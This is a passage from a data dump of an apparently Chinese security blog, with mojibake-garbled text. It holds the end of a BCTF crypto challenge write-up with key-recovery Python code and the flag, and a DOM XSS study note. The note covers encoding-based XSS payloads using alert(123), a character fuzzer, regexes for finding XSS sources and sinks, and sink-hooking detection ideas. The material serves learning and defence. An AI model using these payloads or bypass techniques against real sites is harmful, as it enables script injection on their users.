writeup","permalink":"http://blog.0kami.cn/2016/03/20/old-old-CTF-BCTF-Crypto-SpecialRSA-writeup/","text":"È¢òÁõÆÊèèËø∞Â∞ÜÈôÑÂ∏¶ÁöÑzipÊñá‰ª∂‰∏ãËΩΩÂπ∂Ëß£Âéã„ÄÇÂèØ‰ª•ÁúãÂà∞‰ª•‰∏ãÂá†‰∏™Êñá‰ª∂Ôºö Âä†ÂØÜÁÆóÊ≥ï Á§∫‰æãÂØÜÊñá Á§∫‰æãÊòéÊñá Âä†ÂØÜÁöÑflagÊñá‰ª∂Â§ßËá¥Êàë‰ª¨ÂèØ‰ª•ÁúãÂá∫Êù•ÔºåÈ¢òÁõÆÁöÑÊÑèÂõæ‰∏∫ÈÄöËøáÁ§∫‰æãÂØÜÊòéÊñáÔºåÁÆóÂá∫Âä†ÂØÜÁßòÈí•kÔºåÁÑ∂ÂêéÈÄöËøákËß£ÂØÜflagÊñá‰ª∂„ÄÇÈòÖËØªÂä†Ëß£ÂØÜÁÆóÊ≥ïÔºåÊàë‰ª¨ÂèØ‰ª•ÂæóÂá∫‰ª•‰∏ãÁöÑÊï∞Â≠¶ÂÖ¨ÂºèÔºö12345gcd(k,N)=1,kd+Ny=1,c=&gt;criphertext,m=&gt;plaintext encode c=[(k^r%N)*m]%N decode m=[(d^r%N)*c]%N Â∑≤Áü•2ÁªÑ(m,r,c) N ÁöÑÂÄº Ê±ÇËß£k Âà∞ËøôÈáåÂç°‰∫ÜÂæà‰πÖÔºå‰∏ÄÁõ¥Ê≤°‰∏™Ê≠£Á°ÆÁöÑÊñπÂºèÊù•Ëé∑ÂèñkÔºå‰∏çÁî®Êï∞Â≠¶Â∞±‰ºöÂøòËÆ∞ÂïäÂïäÂïäÂïäÂïäÂïäÂïä„ÄÇÂêéÊù•Ê±ÇÁªÑ‰∫ÜËÄÅÂ∏àÔºåÂæóÂà∞‰∫Ü‰∏Ä‰∏™ÊÄùË∑Ø„ÄÇ12345678910‰∏ãÈù¢ÊâÄÊúâ^-1Ë°®Á§∫ÂØπÂ∫îÁöÑ‰πòÊ≥ïÈÄÜÂÖÉ ÂÅáËÆægcd(r1,r2)=1,ÈÇ£‰πàÂ≠òÂú®a,b‰ΩøÂæóÂÖ¨Âºèr1*a+r2*b=1 ÈÇ£‰πà k^1 =k^(r1*a+r2*b) =k^(r1*a) * k^(r2*b) =(k^r1)^a * (k^r2)^bËÄåk^rn ÂèØ‰ª•ÈÄöËøá(m,r,c)ÂØπÊù•Ëé∑ÂæóËøôÈáåÁõ¥Êé•‰ΩøÁî®encodeÂÖ¨Âºèc=[(k^r%N)*m]%NÈÄöËøáÊé®ÂØºÂèØ‰ª•ÂæóÂá∫k^r=c*(m^-1)mÁöÑÈÄÜÂÖÉÂèØ‰ª•ÈÄöËøáÊâ©Â±ïÊ¨ßÂá†ÈáåÂæ∑ÁÆóÊ≥ïÊù•Ê±ÇÂæó Êúâ‰∫Ü‰∏äÈù¢ÁöÑÊÄùË∑ØÔºåÂ∞±ÂèØ‰ª•ÂÜôÁ®ãÂ∫èÊù•Âä†Ëß£ÂØÜ‰∫ÜÔºåËøôÈáåÊàëÁî®‰∫ÜpythonÊù•ÂÜôÔºåÂÖ∂‰∏≠(m,r,c)ÂØπÊàë‰∫ãÂÖàÊãøÂá∫Êù•‰∫ÜÔºåÊ∏ÖÊ•ö‰∏ÄÁÇπ,‰∏ãÈù¢ÁöÑÁ®ãÂ∫èÊòØÊù•ÁÆókÁöÑ123456789101112131415161718192021222324252627282930313233343536373839404142434445import msgpackfrom Crypto.PublicKey import RSAN = 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131Ldef Ext_Euclid (a , b ): ''' Êâ©Â±ïÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ï a*x + b*y = gcd(a,b) ËøîÂõû x,y‰ª•ÂèäaÔºåbÁöÑÊúÄÂ§ßÂÖ¨Á∫¶Êï∞gcd :param a: :param b: :return:x,y‰ª•ÂèäaÔºåbÁöÑÊúÄÂ§ßÂÖ¨Á∫¶Êï∞gcd ''' if (b == 0): return 1 , 0 , a else: x , y , q=Ext_Euclid( b , a % b ) x , y = y,( x - (a // b) * y ) return x , y , qm1=8246074182642091125578311828374843698994233243811347691229334829218700728624047916518503687366611595562099039411430662968666847086659721231623198995017758424796091810259884653332576136128144958751327844746991264667007359518181363522934430676655236880489550093852524801304612322373542296281962196795304499711006801211783005857297362930338978872451934860435597545642219213551685973208209873623909629278321181485010964460652298690058747090298312365230671723790850998541956664376820820570709272500330966205578898690396706695024001970727864091436518202414166919020415892764617055978488996164642229582717493375419993187360Lc1=14548997380897265239778884825381301109965518989661808090688952232381091726761464959572943383024428028270717629953894592890859128818839328499002950828491521254480795364789013196240119403187073307558598496713832435709741997056117831860370227155633169019665564392649528306986826960829410120348913586592199732730933259880469229724149887380005627321752843489564984358708013300524640545437703771424168108213045567568595093421366224818609501318783680497763353618110184078118456368631056649526433730408976988014678391205055298782061128568056163894010397245301425676232126267874656710256838457728944370612289985071385621160886Lm11=RSA.inverse(m1,N)# Ê±ÇÈÄÜÂÖÉkr1=m11*c1m2=15575051453858521753108462063723750986386093067763948316612157946190835527332641201837062951012227815568418309166473080588354562426066694924364886916408150576082667797274000661726279871971377438362829402529682825471299861814829463510659258586020732228351258291527965822977048954720558973840956731377322516168809373640494227129998871167089589689796024458501705704779109152762373660542684880052489213039920383757930855300338529058000330103359636123251274293258Lc2=12793942795110038319724531875568693507469327176085954164034728727511164833335101755153514030256152878364664079056565385331901196541015393609751624971554016671160730478932343949538202167508319292084519621768851878526657022981883304260886841513342396524869530063372782511380879783246034751883691295368172069170967975561364277514063320691930900258017293871754252209727301719207692321798229276732198521711602080244950295889575423383308099786298184477668302842952215665734671829249323604032320696267130330613134368640401070775927197554082071807605399448960911234829590548855031180158567578928333030631307816223152118126597Lm21=RSA.inverse(m2,N)kr2=m21*c2# print kr2r1=12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443Lr2=7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059La,b,_=Ext_Euclid(r1,r2)print aprint b# print a*r1+b*r2x1=RSA.inverse(kr2,N)k=(pow(kr1, a,N)*pow(x1,-b,N))%Nprint k ÈÄöËøá‰∏äÈù¢ÁöÑÁ®ãÂ∫èÂèØ‰ª•ÁÆóÂá∫ k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961L Êé•‰∏ãÊù•Â∞±ÁÆÄÂçï‰∫ÜÂ∞ÜkÂ∏¶ÂÖ•ÂÆòÊñπÁöÑÁÆóÊ≥ïÂ∞±ÂèØ‰ª•ÂæóÂà∞flag.BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}‰∏äÈù¢Á®ãÂ∫è‰∏≠ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØpowÂáΩÊï∞‰∏çÊîØÊåÅÊåáÊï∞‰∏∫Ë¥üÊï∞ÁöÑÊÉÖÂÜµÔºåÊâÄ‰ª•ËøòË¶ÅÂÜçËΩ¨‰∏Ä‰∏ãÂºØ„ÄÇ 1234a&gt;0,b&lt;0(k^r)^b=(k^-r)^-bÊâÄ‰ª•ÂèØ‰ª•ÂÖàÊ±ÇÂá∫k^r mod NÁöÑÈÄÜÂÖÉ ÊÄªÁªìÊï∞Â≠¶ÊñπÈù¢ÁöÑÁü•ËØÜËøòÊòØÁü≠ÊùøÂïäÔºå‰ª•ÂêéÂæóÂä†Âº∫‰∏Ä‰∏ã:)"},{"title":"„ÄêVULNERABLITY„ÄëDOM XSS","permalink":"http://blog.0kami.cn/2016/03/17/old-old-DOM-XSS/","text":"ÂºïË®Ä ËøôÂá†Â§©ÈòÖËØª‰∫Ü„ÄäWebÂâçÁ´ØÈªëÂÆ¢ÊäÄÊúØÊè≠Áßò„Äã ÔºåÂØπDOMÂûãÁöÑXSSËøõË°å‰∏Ä‰∏™ÊÄªÁªìÔºåÂÜÖÂÆπ‰∏ªË¶Å‰∏∫‰π¶‰∏≠ÊèêÂà∞ÁöÑÁü•ËØÜÁÇπÔºåÊï¥ÁêÜÊï¥ÁêÜ‰Ωú‰ª•ÂêéÂ§ç‰π†ÊâÄÁî®„ÄÇ DOMÁ±ªÂûãÁöÑXSS‰∏éÂèçÂ∞ÑÂûã„ÄÅÂ≠òÂÇ®ÂûãXSSÈÉΩ‰∏çÂêåÔºåDOMÂûãXSS‰∏çÁî®ÊúçÂä°Âô®Á´ØËß£ÊûêÂìçÂ∫îÁöÑÂèÇ‰∏éÔºåËß¶ÂèëDOMÂûãXSSÂèØ‰ª•ËØ¥‰∏ªË¶Å‰æùÈù†ÊµèËßàÂô®ÂÆ¢Êà∑Á´ØÁöÑËß£Êûê„ÄÇÂ∏∏ËßÅÁöÑËæìÂá∫ÁÇπËßÅ0x04ÈôÑÂΩï„ÄÇ DOMÊ∏≤Êüì È¶ñÂÖàÊàë‰ª¨Êù•ÁêÜËß£‰∏Ä‰∏ãHTML‰∏éJavascriptËá™Ëß£Á†ÅÊú∫Âà∂ÔºåÊü•Áúã‰ª•‰∏ã‰∏â‰∏™‰æãÂ≠ê123456789101112131. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;)&quot; /&gt;2. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;))&quot; /&gt;&lt;script&gt; function HtmlEncode(str) &#123; var s=&quot;&quot;; if(str.length==0) return &quot;&quot;; s=str.replace(/&amp;/g, &quot;&amp;amp;&quot;); s=str.replace(/&lt;/g, &quot;&amp;lt;&quot;); s=str.replace(/&gt;/g, &quot;&amp;gt;&quot;); s=str.replace(/\\&quot;/g, &quot;&amp;quot;&quot;); return s; &#125;3. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;img src=@ onerror=alert(123) /&amp;gt;&apos;)&quot; /&gt; ÂØπ‰∫éÁ¨¨‰∏ÄÁßçÊÉÖÂÜµÔºåÂæàÊ∏ÖÊ•öÔºåÁÇπÂáªËøô‰∏™ÊåâÈíÆÂêéÔºå‰ºöÂ∞Ü&lt;img src=@ onerror=alert(123) /&gt;ÂÜôÂÖ•DOM‰∏≠ÔºåÂπ∂Ëß¶Âèëalert(123)„ÄÇËÄåÁ¨¨‰∫åÁßç‰∏éÁ¨¨‰∏âÁßçÔºådocument.writeÁöÑÂÜÖÂÆπÈÉΩÂèòÊàê‰∫Ü&amp;lt;img src=@ onerror=alert(123) /&amp;gt;ÔºåÂå∫Âà´Âú®‰∫é‰∏Ä‰∏™ÊòØÂú®HTMLÊ†áÁ≠æ‰∏≠,‰∏Ä‰∏™ÊòØÈÄöËøáJavascriptÂ§ÑÁêÜÂêéÊâçÂèòÊàêËøô‰∏™Ê†∑Â≠êÁöÑÔºåÈÇ£‰πàËøô2ÁßçÊÉÖÂÜµÈÉΩ‰ºöËß¶ÂèëÂºπÁ™óÂêóÔºüÁ≠îÊ°àÊòØÁ¨¨‰∫åÁßç‰∏ç‰ºöÔºåËÄåÁ¨¨‰∏âÁßç‰ºöËß¶Âèë„ÄÇ ÂΩ¢ÊàêËøôÊ†∑ÁöÑÂéüÂõ†Â∞±ÊòØÂõ†‰∏∫HTML‰∏éJavascriptËá™Ëß£Á†ÅÊú∫Âà∂ÔºåÂú®HTMLÊ†áÁ≠æ‰∏≠ÁöÑjavascriptÂèØ‰ª•ËøõË°åHTMLÂΩ¢ÂºèÁöÑÁºñÁ†Å„ÄÇÂú®HTMLÊ†áÁ≠æ‰∏≠ÁöÑjavascript‰ª£Á†Å‰ºöÂÖàË¢´HTMLÂΩ¢ÂºèÁöÑÁºñÁ†ÅËøõË°åËß£Á†ÅÔºåÂç≥Á¨¨‰∏âÁßçÊÉÖÂÜµ‰∏≠&amp;lt;img src=@ onerror=alert(123) /&amp;gt;Âú®javascriptËøêË°åÂâçÂ∑≤ÁªèËß£Á†Å‰∏∫&lt;img src=@ onerror=alert(123) /&gt;ÔºåËÄåÁ¨¨‰∫åÁßçÊÉÖÂÜµ‰∏∫javascriptËøêË°å‰∏≠ËøõË°åÁöÑHTMLÂΩ¢ÂºèÁöÑÁºñÁ†ÅÔºåÊâÄ‰ª•ÂÜôÂà∞DOM‰∏≠Êó∂Áõ¥Êé•ÊòæÁ§∫Âú®È°µÈù¢‰∏ä„ÄÇHTML‰∏≠ÁöÑÁºñÁ†ÅÔºö ËøõÂà∂ÁºñÁ†ÅÔºö&#xH;(ÂçÅÂÖ≠ËøõÂà∂Ê†ºÂºè)„ÄÅ&#D;(ÂçÅËøõÂà∂Ê†ºÂºè),ÊúÄÂêéÁöÑÂàÜÂè∑ÂèØ‰ª•‰∏çË¶Å HTMLÂÆû‰ΩìÁºñÁ†ÅÔºöÂç≥‰∏äÈù¢ÁöÑÈÇ£‰∏™HtmlEncode ÈÇ£‰πàÂêåÊ†∑ÁöÑÔºåÂú®javascript‰∏ä‰∏ãÊñáÁéØÂ¢É‰∏≠ÔºåÂ∞ÜÂÜÖÂÆπÊîπ‰∏∫javascriptÁöÑÁºñÁ†ÅÔºåÂêåÊ†∑‰ºöËá™Ëß£Á†ÅÔºåÊàë‰ª¨Êù•Áúã‰∏ã‰∏Ä‰∏™‰æãÂ≠ê12345678&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;&lt;script&gt; function $(id)&#123;return document.getElementById(id);&#125;; $(&apos;exec_btn&apos;).onclick=function()&#123; document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;); document.write(&apos;\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0040\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0032\\u0033\\u0029\\u0020\\u002f\\u003e&apos;); &#125; ‰∏äÈù¢2‰∏≠writeÂá∫Áé∞ÁöÑÁªìÊûúÊòØÁõ∏ÂêåÁöÑÔºåÂêåÊ†∑ÁöÑÈÅìÁêÜÔºåÁî±‰∫é‰∏äËø∞ÁºñÁ†Å‰∏∫javascriptÁöÑÁºñÁ†ÅÂΩ¢ÂºèÔºåÂπ∂‰∏îÂú®javascriptÁöÑ‰∏ä‰∏ãÊñáÁéØÂ¢É‰∏≠Ôºå‰ºöÂÖàËøõË°åËß£Á†ÅÔºåÂÜçËøêË°åjavascript„ÄÇJavaScript‰∏≠ÁöÑÁºñÁ†ÅÔºö UnicodeÂΩ¢ÂºèÔºö\\uH ÊôÆÈÄöÂçÅÂÖ≠ËøõÂà∂Ôºö\\xH Á∫ØËΩ¨‰πâÔºö\\‚Äô„ÄÅ\\‚Äù„ÄÅ\\&lt;„ÄÅ>ËøôÊ†∑Âú®ÁâπÊÆäÂ≠óÁ¨¶ÂâçÂä†\\ËøõË°åËΩ¨‰πâ ÈÄöËøá‰∏äÈù¢Âá†‰∏™‰æãÂ≠êÔºåÊàë‰ª¨ÂèØ‰ª•Áü•ÈÅìÂú®HTML‰∏≠‰∏éÂú®Javascript‰∏≠Ëá™Âä®Ëß£Á†ÅÁöÑÂ∑ÆÂºÇÔºåÂ¶ÇÊûúÈò≤Âæ°Ê≤°ÊúâÂå∫ÂàÜËøôÊ†∑ÁöÑÂú∫ÊôØÔºåÂ∞±‰ºöÂá∫Áé∞ÈóÆÈ¢ò„ÄÇ ÁêÜËß£‰∫Ü‰∏äËø∞ÁöÑËá™Ëß£Á†ÅÊú∫Âà∂ÔºåÂú®‰∏çÂêåÁöÑÊ†áÁ≠æ‰∏ã‰ºöÊúâ‰∏çÂêåÁöÑÁªìÊûúÔºåÊØîÂ¶Ç‰∏Ä‰∏ãÂá†‰∏™Ê†áÁ≠æ‰ºöËá™Â∏¶HtmlEncodeÂäüËÉΩ12345678&lt;title&gt;&lt;/title&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;noscript&gt;&lt;/noscript&gt;&lt;noframes&gt;&lt;/noframes&gt;&lt;textarea&gt;&lt;/textarea&gt;&lt;xmp&gt;&lt;/xmp&gt;&lt;plaintext&gt;&lt;/plaintext&gt; &lt;xmp&gt;Ê≤°ÊúâHtmlEncodeÂäüËÉΩÔºå&lt;plaintext&gt;Âú®Firefox‰∏ã‰ºöËøõË°åHtmlEncodeÁºñÁ†ÅÔºåÂú®chrome‰∏ã‰∏ç‰ºö„ÄÇ DOM fuzzing Áõ¥Êé•Áúã‰ª£Á†ÅÊää ‰∏ãÈù¢ÁöÑÁ®ãÂ∫èÁî®pythonÁºñÂÜô123456789101112131415161718192021222324252627282930313233def get_template(template_file): &quot;&quot;&quot;Ëé∑ÂèñfuzzingÁöÑÊ®°ÊùøÊñá‰ª∂ÂÜÖÂÆπ&quot;&quot;&quot; content=&apos;&apos; with open(template_file) as f: content=f.read() return contentdef set_result(result_file,result): &quot;&quot;&quot;ÁîüÊàêfuzzingÁªìÊûúÊñá‰ª∂&quot;&quot;&quot; with open(result_file,&apos;w&apos;) as f: f.write(result)def fuzzing(fuzz_file,result_file): template=get_template(fuzz_file) fuzz_area_0=template.find(&apos;&lt;fuzz&gt;&apos;) fuzz_area_1=template.find(&apos;&lt;/fuzz&gt;&apos;) fuzz_area=template[fuzz_area_0+6:fuzz_area_1].strip() # chars=[] chars=[] for i in xrange(255): # ASCIIÁéõËΩ¨Êç¢‰∏∫Â≠óÁ¨¶ if i!=62: chars.append(chr(i)) fuzz_area_result=&apos;&apos; for c in chars: #ÈÅçÂéÜËøô‰∫õÂ≠óÁ¨¶ ÈÄê‰∏ÄÁîüÊàêfuzzingÂÜÖÂÆπ fuzz_area_r=fuzz_area.replace(&apos;&#123;&#123;char&#125;&#125;&apos;,c) fuzz_area_r=fuzz_area_r.replace(&apos;&#123;&#123;id&#125;&#125;&apos;,str(ord(c))) fuzz_area_result+=fuzz_area_r+&apos;\\n&apos; print fuzz_area_r result=template.replace(fuzz_area,fuzz_area_result) set_result(result_file,result)if __name__==&apos;__main__&apos;: fuzzing(&quot;fuzz_xss_0.html&quot;,&quot;res.html&quot;) ‰∏ãÈù¢‰∏∫fuzz_xss_0.htmlÁöÑÂÜÖÂÆπ12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Fuzz xss 0&lt;/title&gt; &lt;script&gt; function $(x)&#123;return document.getElementById(x);&#125; function f(id)&#123; $(&apos;result&apos;).innerHTML+=id+&apos;&lt;br/&gt;&apos;; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;&lt;code&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;/code&gt;&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;&lt;br/&gt;&lt;h3&gt;Fuzzing...&lt;/h3&gt;&lt;fuzz&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;br/&gt;&lt;/fuzz&gt;&lt;/body&gt;&lt;/html&gt; ÈÄöËøá‰∏äÈù¢ÁöÑfuzzingÊäÄÂ∑ßÔºåÂèØ‰ª•Ëá™Ë°åÊâ©Â±ï DOM XSS ÊåñÊéò ÈùôÊÄÅÊñπÊ≥ï ÈùôÊÄÅÊñπÊ≥ïÊü•ÊâæÂç±Èô©ÂÖ≥ÈîÆÂ≠óÔºåÂèØ‰ª•‰ΩøÁî®‰∏ãÂàóÊ≠£ÂàôË°®ËææÂºèÊù•ÂåπÈÖç„ÄÇ123456789101112131415Finding SourcesThe following regular expression attempts to match most common DOMXSS sources (BETA):/(location\\s*[\\[.])|([.\\[]\\s*[&quot;&apos;]?\\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\\W)|(localStorage|sessionStorage|Database)/Finding SinksThe following regular expression attempts to match most common DOMXSS sinks (BETA):/((src|href|data|location|code|value|action)\\s*[&quot;&apos;\\]]*\\s*\\+?\\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\\s*[&quot;&apos;\\]]*\\s*\\()/This regular expression finds sinks based on jQuery, it also finds the $ function, which is not always insecure:/after\\(|\\.append\\(|\\.before\\(|\\.html\\(|\\.prepend\\(|\\.replaceWith\\(|\\.wrap\\(|\\.wrapAll\\(|\\$\\(|\\.globalEval\\(|\\.add\\(|jQUery\\(|\\$\\(|\\.parseHTML\\(/ ËØ¶ÊÉÖÂèØ‰ª•Áúãhttps://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki‰∏ÄÊó¶ÂèëÁé∞È°µÈù¢Â≠òÂú®ÂèØÁñëÁâπÂæÅÔºåÂ∞±ËøõË°å‰∫∫Â∑•ÂàÜÊûêÔºåËøôÊòØÈùôÊÄÅÊñπÊ≥ïÁöÑ‰ª£‰ª∑ÔºåÂØπ‰∫∫Â∑•ÂèÇ‰∏éË¶ÅÊ±ÇÂæàÈ´ò Âä®ÊÄÅÊñπÊ≥ï Âä®ÊÄÅÊñπÊ≥ïÁõ∏ÂΩì‰∫é‰∏ÄÊ¨°JavascriptÊ∫êÁ†ÅÂä®ÊÄÅÂÆ°ËÆ°ÁöÑËøáÁ®ã„ÄÇ‰π¶‰∏≠ÊèêÂà∞‰∫Ü‰∏§ÁßçÊÄùË∑Ø123&lt;script&gt;eval(location.hash.substr(1));&lt;/script&gt; Â∞±Êãø‰∏äÈù¢ÁöÑ‰æãÂ≠êÊù•ËØ¥ÔºåÂ¶Ç‰ΩïÊ£ÄÊµã‰∏äÈù¢ÁöÑDOM XSS ÊÄùË∑Ø‰∏Ä ÂÄüÁî®ÊµèËßàÂô®Ëá™Ë∫´ÁöÑÂä®ÊÄÅÊÄßÔºåÂèØ‰ª•ÂÜôFirefoxÊèí‰ª∂ÔºåÊâπÈáèÂØπÁõÆÊ†áÂú∞ÂùÄÂèëËµ∑ËØ∑Ê±ÇÔºà‰∏Ä‰∏™Ê®°Á≥äÊµãËØïÁöÑËøáÁ®ãÔºâÔºåËØ∑Ê±ÇÁöÑÂΩ¢Âºè‰∏∫ÔºöÂú®ÁõÆÊ†áÂú∞ÂùÄÂêéÂä†‰∏ä#fuzzingÂÜÖÂÆπÔºåÂ∞±ÂΩìÂâçËøô‰∏™‰æãÂ≠êÊù•ËØ¥„ÄÇÊØîÂ¶ÇÂΩìÂâçfuzzingÂÜÖÂÆπ‰∏∫Ôºövar x=&#39;d0mx55&#39; Âπ∂‰∏îÂØπÂ∏∏ËßÅÁöÑËæìÂá∫ÁÇπÂáΩÊï∞ËøõË°åÂä´ÊåÅÔºåÂ¶Ç123456var _eval=eval;eval=function(x)&#123; if(typeof(x)==&apos;undefined&apos;)&#123;return;&#125; if(x.indexOf(&apos;d0mx55&apos;)!=-1)&#123;alert(&apos;found dom xss&apos;); _eval(x);&#125;; Âú®javascriptÂ±ÇÈù¢Âä´ÊåÅinnerHTMLËøôÊ†∑ÁöÑÂ±ûÊÄßÂ∑≤ÁªèÊ≤°ÈÇ£‰πàÂÆπÊòì‰∫ÜÔºåÂ∏∏Áî®ÁöÑÂ±ûÊÄßÂä´ÊåÅÂèØ‰ª•ÈíàÂØπÂÖ∑‰ΩìÁöÑÂØπË±°ËÆæÁΩÆ__defineSetter__ÔºåÊØîÂ¶Ç‰∏ãÈù¢ÁöÑ‰ª£Á†Å12window.__defineSetter__(&apos;x&apos;,function()&#123;alert(&apos;hijack x&apos;)&#125;);window.x=&apos;xxxxxYYYYYYYY&apos;; ÂΩìxËµãÂÄºÁöÑÊó∂ÂÄôÔºåÂ∞±‰ºöËß¶Âèë‰∫ãÂÖàÂÆö‰πâÂ•ΩÁöÑSetterÊñπÊ≥ï„ÄÇinnerHTMLÂ±ûÊÄßÂ±û‰∫éÈÇ£‰∫õËäÇÁÇπÂØπË±°ÔºåÊÉ≥Âä´ÊåÅÂÖ∑‰ΩìËäÇÁÇπÂØπË±°ÁöÑinnerHTMLÔºåÈúÄË¶Å‰∫ãÂÖàÁü•ÈÅìËøô‰∏™ÂÖ∑‰ΩìËäÇÁÇπÁöÑÂØπË±°ÔºåÁÑ∂ÂêéËÆæÁΩÆ__defineSetter__,ËøôÊ†∑Â¶ÇÊûúË¶ÅÊ£ÄÊµãDOM XSSÔºåÂ∞±Ë¶ÅÂä´ÊåÅÊâÄÊúâÁöÑËæìÂá∫ÁÇπÔºåÊØîËæÉÈ∫ªÁÉ¶ÔºåÈÇ£‰πàÊÄùË∑Ø‰∫åÂèØËÉΩ‰ºöÊØîËæÉÁÆÄÂçï‰∏ÄÁÇπ ÊÄùË∑Ø‰∫å ‰ªçÁÑ∂ÂÄüÁî®ÊµèËßàÂô®Âä®ÊÄÅÊâßË°åÁöÑ‰ºòÂäøÔºåÂÜô‰∏Ä‰∏™FirefoxÊèí‰ª∂ÔºåÊàë‰ª¨ÂÆåÂÖ®‰ª•ÈªëÁõíÁöÑÊñπÂºèËøõË°åÊ®°Á≥äÊµãËØïËæìÂÖ•ÁÇπÔºåÁÑ∂ÂêéÂà§Êñ≠Ê∏≤ÊüìÂêéÁöÑDOMÊ†ë‰∏≠ÊòØÂê¶ÊúâÊàë‰ª¨ÊúüÂæÖÁöÑÂÄºÔºåÊØîÂ¶ÇÔºåÊ®°Á≥äÊµãËØïÁöÑÂÜÖÂÆπÈÉΩÊúâÂ¶Ç‰∏ã‰∏ÄÊÆµ‰ª£Á†Ådocument.write(&#39;d0m&#39;+&#39;x55&#39;)Â¶ÇÊûúËøôÊÆµ‰ª£Á†ÅÈ°∫Âà©ÊâßË°å‰∫ÜÂ∞±‰ºöÂ≠òÂú®d0mx55ÊñáÊú¨ËäÇÁÇπÔºåÂêéÁª≠ÁöÑÊ£ÄÊµãÂ∑•‰ΩúÂè™Ë¶ÅÂà§Êñ≠ÊòØÂê¶Â≠òÂú®Ëøô‰∏™ÊñáÊú¨ËäÇÁÇπÂ∞±ÂèØ‰ª•‰∫Ü123if(document.documentElement.innerHTML.indexOf(&apos;d0mx55&apos;)!=-1)&#123; alert(&apos;found dom xss&apos;);&#125; Ëøô‰∏™ÊÄùË∑Ø‰ª•DOMÊ†ëÁöÑÊîπÂèò‰∏∫Âà§Êñ≠‰æùÊçÆÔºåÁÆÄÂçïÂáÜÁ°ÆÔºå‰ΩÜÊòØÂêåÊ†∑Êó†Ê≥ïÈÅøÂÖçÈÇ£‰∫õÈÄªËæëÂà§Êñ≠‰∏äÂØºËá¥ÁöÑÊºèÊä•„ÄÇ ÈôÑÂΩï ËæìÂá∫ÁÇπ javascript code Áõ¥Êé•ËæìÂá∫HTMLÂÜÖÂÆπ document.write(‚Ä¶)document.writeln(‚Ä¶) document.body.innerHtml=‚Ä¶ Áõ¥Êé•‰øÆÊîπDOMÊ†ëÔºàÂåÖÊã¨DHTML‰∫ã‰ª∂Ôºâ document.forms[0].action=‚Ä¶document.attachEvent(‚Ä¶)document.create‚Ä¶(‚Ä¶)document.execCommand(‚Ä¶)document.body. ‚Ä¶widow.attachEvent(‚Ä¶) ÊõøÊç¢document url document.location=‚Ä¶(‰ª•ÂèäÁõ¥Êé•ËµãÂÄºÁªôlocationÁöÑhref,host,hostnameÂ±ûÊÄß)document.location.hostname=‚Ä¶document.location.replace(‚Ä¶)document.location.assign(‚Ä¶)documnent.URL=‚Ä¶window.navigate(‚Ä¶) ÊâìÂºÄÊàñ‰øÆÊîπÊñ∞Á™óÂè£ document.open(‚Ä¶)window.open(‚Ä¶)window.location.href=‚Ä¶(‰ª•ÂèäÁõ¥Êé•ËµãÂÄºÁªôlocationÁöÑhref,host,hostnameÂ±ûÊÄß) Áõ¥Êé•ÊâßË°åËÑöÊú¨ eval(‚Ä¶)window.execScript(‚Ä¶)window.setInterval(‚Ä¶)window.setTimeout(‚Ä¶)"},{"title":"„ÄêOTHERS„Äëflask virtualenvÁéØÂ¢ÉÊê≠Âª∫","permalink":"http://blog.0kami.cn/2016/03/16/old-old-flask-virtualenv/","text":"ÂºïË®Äpython 